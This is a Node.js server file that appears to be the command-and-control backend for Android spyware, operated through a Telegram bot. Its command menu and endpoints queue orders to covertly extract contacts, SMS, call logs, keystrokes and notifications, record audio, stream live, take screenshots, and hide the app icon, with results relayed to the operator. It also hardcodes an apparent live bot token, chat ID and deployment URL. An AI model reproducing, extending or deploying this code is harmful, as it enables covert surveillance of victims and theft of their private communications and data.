const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
const devices = new Map();

// Store authorized chat IDs
const authorizedChats = new Set([
    '5326373447', // Your chat ID
]);

// Middleware
app.use(express.json());

// ============= HELPER FUNCTIONS =============

function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

function sendJsonResponse(res, data, statusCode = 200) {
    try {
        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
    } catch (e) {
        console.error('Error stringifying JSON:', e);
        res.status(500).json({ error: 'Internal server error' });
    }
}

// ============= TELEGRAM MESSAGE HELPERS =============

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) {
            console.error('❌ Attempted to send empty message');
            return null;
        }

        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        
        // Use HTML parse_mode which is more forgiving
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });
        
        console.log(`✅ Message sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        
        // If HTML fails, try without formatting
        if (error.response?.status === 400) {
            console.log('⚠️ HTML failed, retrying as plain text');
            try {
                const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: chatId,
                    text: text.replace(/<[^>]*>/g, '') // Strip HTML tags
                });
                return response.data;
            } catch (e) {
                console.error('❌ Plain text also failed:', e.response?.data || e.message);
            }
        }
        return null;
    }
}

// ============= COMMAND HELPERS =============
function getHelpMessage() {
    return `<b>🤖 COMPLETE COMMAND LIST</b>

<b>🔍 MONITORING COMMANDS</b>
/help - Get full commands
/status - Get full device status
/location - Get current GPS location
/battery - Get battery level only
/storage - Get storage information
/network - Get network info (IP, WiFi, Mobile)

<b>📱 DATA EXTRACTION COMMANDS</b>
/contacts - Get contact list
/calllogs - Get recent call logs
/sms - Get recent SMS messages
/apps - List installed apps
/keystrokes - Get recent keystrokes
/notifications - Get recent notifications

<b>🎤 RECORDING COMMANDS</b>
/record - Start 60s audio recording NOW
/stream_start - Start live streaming
/stream_stop - Stop live streaming

<b>⚙️ SERVICE CONTROL COMMANDS</b>
/start_screenshot - Start screenshot SERVICE (continuous)
/stop_screenshot - Stop screenshot service
/start_recording - Start scheduled recording SERVICE
/stop_recording - Stop recording service
/start_stream - Start streaming service
/stop_stream - Stop streaming service

<b>📸 SCREENSHOT COMMANDS</b>
/screenshot - Take a screenshot NOW
/screenshot_settings - View current screenshot settings
/quality_low - Set screenshot quality to 30%
/quality_medium - Set screenshot quality to 60% (default)
/quality_high - Set screenshot quality to 85%
/quality_original - Set screenshot quality to 100%
/format_jpeg - Save screenshots as JPEG (smaller files)
/format_png - Save screenshots as PNG (lossless)
/format_webp - Save screenshots as WebP (modern format)
/resize_on [width] - Enable resize to specified width (default 800px)
/resize_off - Disable resize

<b>📸 AUTO-SCREENSHOT COMMANDS</b>
/auto_on - Enable auto-screenshot when apps open
/auto_off - Disable auto-screenshot
/auto_status - Check auto-screenshot status
/auto_delay [ms] - Set delay before screenshot (e.g., /auto_delay 3000)
/add_target [package] - Add app to monitor (e.g., /add_target com.spotify)
/remove_target [package] - Remove app from monitoring
/target_apps - List all monitored apps

<b>🛠️ UTILITY COMMANDS</b>
/ping - Test connection
/time - Get device time
/info - Get detailed device info

<b>📊 STATS COMMANDS</b>
/logs_count - Get total log count
/logs_recent - Get 10 most recent logs
/stats - Get detailed statistics

<b>⚠️ DANGER COMMANDS</b>
/clear_logs - Clear all logs
/reboot_app - Restart all services
/hide_icon - Hide launcher icon
/show_icon - Show launcher icon

<b>📋 QUICK REFERENCE</b>
• Just /record - Quick 60s recording
• Just /screenshot - Quick screenshot
• /quality_low - Reduce screenshot size
• /start_recording - Enable continuous scheduled recording
• /start_screenshot - Enable continuous screenshot service
• /reboot_app - Restart all services

For more help, visit the dashboard at http://127.0.0.1:8080`;
}


// ============= WEBHOOK ENDPOINT =============

app.post('/webhook', async (req, res) => {
    // Send 200 OK immediately
    res.sendStatus(200);
    
    // Process asynchronously
    setImmediate(async () => {
        try {
            const update = req.body;
            console.log('📩 Received update:', JSON.stringify(update, null, 2));

            if (!update?.message) {
                console.log('📭 Non-message update');
                return;
            }

            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;

            // Check authorization
            if (!isAuthorizedChat(chatId)) {
                console.log(`⛔ Unauthorized chat: ${chatId}`);
                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                return;
            }

            // Handle commands
            if (text?.startsWith('/')) {
                await handleCommand(chatId, text, messageId);
            }
        } catch (error) {
            console.error('❌ Error processing webhook:', error);
        }
    });
});

// ============= COMMAND HANDLER =============

async function handleCommand(chatId, command, messageId) {
    console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
    console.log(`📊 Devices in memory: ${devices.size}`);

    // Handle help immediately - no device needed
    if (command === '/help' || command === '/start') {
        console.log('📋 Sending help menu directly from server');
        const helpMessage = getHelpMessage();
        await sendTelegramMessage(chatId, helpMessage);
        console.log('✅ Help menu sent');
        return;
    }

    // Find device for this chat
    let deviceId = null;
    let device = null;
    
    for (const [id, d] of devices.entries()) {
        if (String(d.chatId) === String(chatId)) {
            deviceId = id;
            device = d;
            console.log(`✅ Found device: ${deviceId}`);
            break;
        }
    }

    if (!deviceId) {
        console.log(`❌ No device found for chat ${chatId}`);
        await sendTelegramMessage(chatId, 
            '❌ No device registered.\n\nPlease make sure the Android app is running.');
        return;
    }

    // Update last seen
    device.lastSeen = Date.now();

    // Queue command for device (remove leading slash)
    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const commandObject = {
        command: cleanCommand,
        originalCommand: command,
        messageId: messageId,
        timestamp: Date.now()
    };
    
    device.pendingCommands.push(commandObject);
    console.log(`📝 Command queued:`, commandObject);
    console.log(`📊 Pending commands: ${device.pendingCommands.length}`);

    // Acknowledge
    await sendTelegramMessage(chatId, `⏳ Processing: ${command}`);
}

// ============= API ENDPOINTS =============

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: authorizedChats.size,
        timestamp: Date.now()
    });
});

// Ping endpoint for keep-alive
app.get('/api/ping/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    console.log(`💓 Ping from device ${deviceId}`);
    
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        res.json({ status: 'alive', timestamp: Date.now() });
    } else {
        res.status(404).json({ status: 'unknown' });
    }
});

// Get pending commands for device
app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device?.pendingCommands?.length > 0) {
            const commands = [...device.pendingCommands];
            device.pendingCommands = [];
            console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
            sendJsonResponse(res, { commands });
        } else {
            sendJsonResponse(res, { commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        sendJsonResponse(res, { commands: [], error: e.message }, 500);
    }
});

// Receive command result from device
app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    console.log(`📨 Result from ${deviceId}:`, { command, result, error });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        const message = error 
            ? `❌ <b>Command Failed</b>\n\n${command}\n\nError: ${error}`
            : `✅ <b>Command Executed</b>\n\n${command}\n\nResult:\n${result}`;
        
        await sendTelegramMessage(chatId, message);
    }
    
    res.sendStatus(200);
});

// Register device
app.post('/api/register', async (req, res) => {
    const { deviceId, chatId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId, chatId, deviceInfo });
    
    if (!deviceId || !chatId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    
    if (!isAuthorizedChat(chatId)) {
        console.log(`⛔ Unauthorized registration from chat: ${chatId}`);
        return res.status(403).json({ error: 'Chat ID not authorized' });
    }
    
    const deviceData = {
        chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: []
    };
    
    devices.set(deviceId, deviceData);
    
    console.log(`✅ Device registered: ${deviceId} for chat ${chatId}`);
    console.log(`📊 Total devices: ${devices.size}`);
    
    // Send confirmation
    await sendTelegramMessage(chatId, 
        `✅ <b>Device Connected!</b>\n\n` +
        `Model: ${deviceInfo.model}\n` +
        `Android: ${deviceInfo.android}\n` +
        `Battery: ${deviceInfo.battery}\n` +
        `ID: ${deviceId.substring(0, 8)}...`);
    
    res.json({ status: 'registered', deviceId });
});

// List all devices
app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [id, device] of devices.entries()) {
        deviceList.push({
            deviceId: id,
            chatId: device.chatId,
            lastSeen: new Date(device.lastSeen).toISOString(),
            model: device.deviceInfo?.model || 'Unknown',
            android: device.deviceInfo?.android || 'Unknown'
        });
    }
    res.json({ total: devices.size, devices: deviceList });
});

// Debug endpoint
app.get('/api/debug/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        res.json({
            deviceId,
            chatId: device.chatId,
            deviceInfo: device.deviceInfo,
            lastSeen: new Date(device.lastSeen).toISOString(),
            pendingCommands: device.pendingCommands || []
        });
    } else {
        res.json({ error: 'Device not found' });
    }
});

// Test endpoints
app.get('/test', (req, res) => {
    res.send(`
        <html>
        <body>
            <h1>✅ Server Running</h1>
            <p>Time: ${new Date().toISOString()}</p>
            <p>Devices: ${devices.size}</p>
            <p>Authorized Chats: ${Array.from(authorizedChats).join(', ')}</p>
            <p><a href="/test-help">Send Test Help</a></p>
        </body>
        </html>
    `);
});

app.get('/test-help', async (req, res) => {
    const chatId = '5326373447';
    const helpMessage = getHelpMessage();
    const result = await sendTelegramMessage(chatId, helpMessage);
    res.json({ success: !!result, result });
});

// ============= START SERVER =============

app.listen(PORT, () => {
    console.log('\n🚀 ==================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log('🚀 ==================================\n');
});
